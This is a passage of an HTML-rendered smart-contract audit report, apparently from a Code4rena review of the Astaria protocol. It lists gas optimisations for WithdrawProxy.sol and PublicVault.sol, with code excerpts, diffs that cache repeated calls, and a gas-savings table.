class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (s.withdrawRatio == uint256(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      ERC20(asset()).safeTransfer(VAULT(), balance);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      ERC20(_asset).safeTransfer(_vault, balance);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       transferAmount = uint256(s.withdrawRatio).mulDivDown(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         balance,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        10**ERC20(asset()).decimals()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        10**ERC20(_asset).decimals()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -278,12 +280,12 @@ contract WithdrawProxy is ERC4626Cloned, WithdrawVaultBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       if (balance &gt; 0) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        ERC20(asset()).safeTransfer(VAULT(), balance);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        ERC20(_asset).safeTransfer(_vault, balance);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     s.finalAuctionEnd = 0;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    emit Claimed(address(this), transferAmount, VAULT(), balance);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    emit Claimed(address(this), transferAmount, _vault, balance);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h3 id=\"withdrawproxysoldrain-result-of-asset-should-be-cached\" style=\"position:relative;\"><a href=\"#withdrawproxysoldrain-result-of-asset-should-be-cached\" aria-label=\"withdrawproxysoldrain result of asset should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>WithdrawProxy.sol.drain(): Result of asset() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L289-L300\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/WithdrawProxy.sol#L289-L300</a></p>\n<p><strong>Saves  177 Gas on average</strong>\n|        | Min    | Average | Median   | Max   |\n| ------ | --- | ------- | ----- | ----- |\n| Before | 7268    | 16214   | 16214 | 25160 |\n| After  | 7091    | 16037   | 16037 | 24983 |</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"210\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">WithdrawProxy</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">289</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">drain</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">293: {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">294</span><span class=\"mtk1\">:    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">balance</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">295</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">296</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">balance</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">297</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">298</span><span class=\"mtk1\">:    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">safeTransfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">299</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">300</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"211\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/WithdrawProxy.sol b/src/WithdrawProxy.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 9906ec7..03ea25f 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/WithdrawProxy.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/WithdrawProxy.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -291,11 +291,12 @@ contract WithdrawProxy is ERC4626Cloned, WithdrawVaultBase {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     onlyVault</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     returns (uint256)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    uint256 balance = ERC20(asset()).balanceOf(address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    address _asset = asset();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint256 balance = ERC20(_asset).balanceOf(address(this));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (amount &gt; balance) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       amount = balance;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    ERC20(asset()).safeTransfer(withdrawProxy, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    ERC20(_asset).safeTransfer(withdrawProxy, amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     return amount;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h3 id=\"publicvaultsolmindepositamount-erc20assetdecimals-should-be-cached-rather-than-call-it-twice\" style=\"position:relative;\"><a href=\"#publicvaultsolmindepositamount-erc20assetdecimals-should-be-cached-rather-than-call-it-twice\" aria-label=\"publicvaultsolmindepositamount erc20assetdecimals should be cached rather than call it twice permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PublicVault.sol.minDepositAmount(): ERC20(asset()).decimals() should be cached rather than call it twice</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L96-L108\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L96-L108</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"212\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">96</span><span class=\"mtk1\">:  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">minDepositAmount</span><span class=\"mtk1\">()</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">97:    </span><span class=\"mtk11\">public</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">98:    </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">99:    </span><span class=\"mtk11\">virtual</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">100:    </span><span class=\"mtk11\">override</span><span class=\"mtk1\">(</span><span class=\"mtk12\">ERC4626Cloned</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">101:    </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">102:  {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">103</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() == </span><span class=\"mtk11\">uint8</span><span class=\"mtk1\">(</span><span class=\"mtk7\">18</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">//@audit: Initial call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">104</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">100</span><span class=\"mtk1\"> </span><span class=\"mtk12\">gwei</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">105</span><span class=\"mtk1\">:    } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">106</span><span class=\"mtk1\">:      </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk7\">10</span><span class=\"mtk1\">**(</span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">asset</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() - </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span><span class=\"mtk3\">//@audit: second call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">107</span><span class=\"mtk1\">:    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">108</span><span class=\"mtk1\">:  }</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"213\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PublicVault.sol b/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 16247ce..c52356e 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -100,10 +100,11 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     override(ERC4626Cloned)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     returns (uint256)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    if (ERC20(asset()).decimals() == uint8(18)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    uint8 _assetDecimals = ERC20(asset()).decimals();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    if (_assetDecimals== uint8(18)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       return 100 gwei;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     } else {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      return 10**(ERC20(asset()).decimals() - 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      return 10**(_assetDecimals - 1);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   }</span></span></span></code></pre>\n<h3 id=\"publicvaultsol_deploywithdrawproxyifnotdeployed-router-should-be-cached\" style=\"position:relative;\"><a href=\"#publicvaultsol_deploywithdrawproxyifnotdeployed-router-should-be-cached\" aria-label=\"publicvaultsol_deploywithdrawproxyifnotdeployed router should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PublicVault.sol._deployWithdrawProxyIfNotDeployed(): ROUTER() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L216-L231\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L216-L231</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"214\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">219</span><span class=\"mtk1\">:    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">].</span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">220</span><span class=\"mtk1\">:      </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">epochData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">epoch</span><span class=\"mtk1\">].</span><span class=\"mtk12\">withdrawProxy</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">ClonesWithImmutableArgs</span><span class=\"mtk1\">.</span><span class=\"mtk11\">clone</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">221</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">IAstariaRouter</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">BEACON_PROXY_IMPLEMENTATION</span><span class=\"mtk1\">(),</span><span class=\"mtk3\">//@audit: 1st call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">222</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">223</span><span class=\"mtk1\">:          </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk11\">ROUTER</span><span class=\"mtk1\">()), </span><span class=\"mtk3\">// router is the beacon //@audit: 2nd call</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"215\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PublicVault.sol b/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 16247ce..39b7be6 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -217,10 +217,11 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     if (s.epochData[epoch].withdrawProxy == address(0)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      IAstariaRouter _router = ROUTER();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       s.epochData[epoch].withdrawProxy = ClonesWithImmutableArgs.clone(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        IAstariaRouter(ROUTER()).BEACON_PROXY_IMPLEMENTATION(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        IAstariaRouter(_router).BEACON_PROXY_IMPLEMENTATION(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         abi.encodePacked(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-          address(ROUTER()), // router is the beacon</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          address(_router), // router is the beacon</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           uint8(IAstariaRouter.ImplementationType.WithdrawProxy),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           asset(), // token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">           address(this), // vault</span></span></span></code></pre>\n<h3 id=\"publicvaultsolprocessepoch-totalassets-should-be-cached\" style=\"position:relative;\"><a href=\"#publicvaultsolprocessepoch-totalassets-should-be-cached\" aria-label=\"publicvaultsolprocessepoch totalassets should be cached permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>PublicVault.sol.processEpoch(): totalAssets() should be cached</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L322-L326\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/PublicVault.sol#L322-L326</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"216\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: /</span><span class=\"mtk12\">src</span><span class=\"mtk1\">/</span><span class=\"mtk12\">PublicVault</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">322</span><span class=\"mtk1\">:        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() &gt; </span><span class=\"mtk12\">expected</span><span class=\"mtk1\">) { </span><span class=\"mtk3\">//@audit: Initial call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">323</span><span class=\"mtk1\">:          </span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">withdrawReserve</span><span class=\"mtk1\"> = (</span><span class=\"mtk11\">totalAssets</span><span class=\"mtk1\">() - </span><span class=\"mtk12\">expected</span><span class=\"mtk1\">)</span><span class=\"mtk3\">//@audit: 2nd call</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">324</span><span class=\"mtk1\">:            .</span><span class=\"mtk11\">mulWadDown</span><span class=\"mtk1\">(</span><span class=\"mtk12\">s</span><span class=\"mtk1\">.</span><span class=\"mtk12\">liquidationWithdrawRatio</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">325</span><span class=\"mtk1\">:            .</span><span class=\"mtk11\">safeCastTo88</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">326</span><span class=\"mtk1\">:        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"217\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/src/PublicVault.sol b/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index 16247ce..4f5f6b8 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/src/PublicVault.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -317,10 +317,10 @@ contract PublicVault is VaultImplementation, IPublicVault, ERC4626Cloned {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       currentWithdrawProxy.setWithdrawRatio(s.liquidationWithdrawRatio);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">       uint256 expected = currentWithdrawProxy.getExpected();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-      unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        if (totalAssets() &gt; expected) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-          s.withdrawReserve = (totalAssets() - expected)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      uint256 _totalAssets = totalAssets();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+      unchecked {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        if (_totalAssets &gt; expected) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+          s.withdrawReserve = (_totalAssets - expected)</span></span></span>\n<span class=\"grvsc-line\"><span 